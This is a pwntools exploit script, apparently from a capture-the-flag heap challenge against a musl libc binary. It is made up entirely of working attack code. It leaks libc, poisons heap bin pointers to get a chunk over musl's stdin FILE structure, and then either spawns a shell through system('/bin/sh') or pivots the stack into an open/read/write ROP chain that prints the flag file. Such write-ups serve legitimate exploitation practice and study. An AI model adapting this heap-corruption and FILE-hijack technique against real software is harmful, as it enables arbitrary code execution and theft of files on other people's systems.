# -*- coding=utf-8 -*-
from pwn import *
r = process(['./libc.so','./pwn'])
libc = ELF('./libc.so')
#context.log_level = 'debug'
def malloc(size):
	r.sendlineafter('choice:','1')
	r.sendlineafter('Size:',str(size))

def edit(index,size,data):
	r.sendlineafter('choice:','2')
	r.sendlineafter('index:',str(index))
	r.sendlineafter('Size:',str(size))
	r.sendlineafter('Data:',data)

def show(index):
	r.sendlineafter('choice:','3')
	r.sendlineafter('index:',str(index))

def free(index):
	r.sendlineafter('choice:','4')
	r.sendlineafter('index:',str(index))

def my_recv():
	msg = r.recvuntil('Done!')
	log.info(msg)

def print_chunk_ptr():
	r.recvuntil('chunk_ptr:')
	fuck = int(r.recvline().strip(),16)
	log.success(hex(fuck))

def fuck_system():
	r.recvuntil('WhiteGive puts addr:')
	libc_base = int(r.recvline().strip(),16) - libc.sym['puts']
	stdin = libc_base + libc.sym['__stdin_FILE']
	stdout = libc_base + libc.sym['__stdout_FILE']
	bss = libc_base + libc.bss()
	system = libc_base + libc.sym['system']
	log.success(hex(libc_base))
	log.success(hex(bss))
	log.success('stdin ==> '+hex(stdin))
	fuckit = stdin
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)

	free(1)
	free(3)
	edit(1,0x10,p64(fuckit)*2)
	malloc(0x10)
	bin37 = libc_base + 0x292e40
	log.success(hex(bin37))
	edit(3,0x10,p64(bin37-0x10)+p64(fuckit))
	malloc(0x10)
	malloc(0x20)#7

	payload = '\x00'*0xf0
	payload += '/bin/sh\x00'+p64(0)*8
	payload += p64(system)
	pause()
	edit(7,len(payload),payload)
	r.interactive()

def house_of_musl_dininghall():
	r.recvuntil('WhiteGive puts addr:')
	libc_base = int(r.recvline().strip(),16) - libc.sym['puts']
	stdin = libc_base + libc.sym['__stdin_FILE']
	stdout = libc_base + libc.sym['__stdout_FILE']
	bss = libc_base + libc.bss()
	system = libc_base + libc.sym['system']
	log.success(hex(libc_base))
	log.success(hex(bss))
	log.success('stdin ==> '+hex(stdin))
	dininghall_gadget = libc_base + 0x000000000004951a
	log.success('dininghall_gadget ==> '+hex(dininghall_gadget))
	#0x000000000004951a: mov rdx, qword ptr [rdi + 0x30]; mov rsp, rdx; mov rdx, qword ptr [rdi + 0x38]; jmp rdx;
	ret = libc_base + 0x0000000000000cdc
	fuckit = stdin
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)
	malloc(0x10)

	free(1)
	free(3)
	edit(1,0x10,p64(fuckit)*2)
	malloc(0x10)
	bin37 = libc_base + 0x292e40
	log.success(hex(bin37))
	edit(3,0x10,p64(bin37-0x10)+p64(fuckit))
	malloc(0x10)
	malloc(0x20)#7


	rdi = 0x0000000000014862+libc_base
	rsi = 0x000000000001c237+libc_base
	rdx = 0x000000000001bea2+libc_base
	open_ = libc_base+libc.sym['open']
	read = libc_base+libc.sym['read']
	write = libc_base+libc.sym['write']
	rop = p64(rdi)+p64(0)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x8)+p64(read)
	rop += p64(rdi)+p64(libc_base+libc.bss())+p64(rsi)+p64(0)+p64(open_)
	rop += p64(rdi)+p64(3)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x100)+p64(read)
	rop += p64(rdi)+p64(1)+p64(rsi)+p64(libc_base+libc.bss())+p64(rdx)+p64(0x100)+p64(write)


	rop_addr = stdin+0x10
	payload = rop.ljust(0xf0,'\x00')
	payload += p64(0)*4+p64(1)*2
	payload += p64(rop_addr)
	payload += p64(ret)
	payload += p64(0)
	payload += p64(dininghall_gadget) 

	pause()
	edit(7,len(payload)+0x10,payload)
	r.sendline('./flag\x00')
	r.interactive()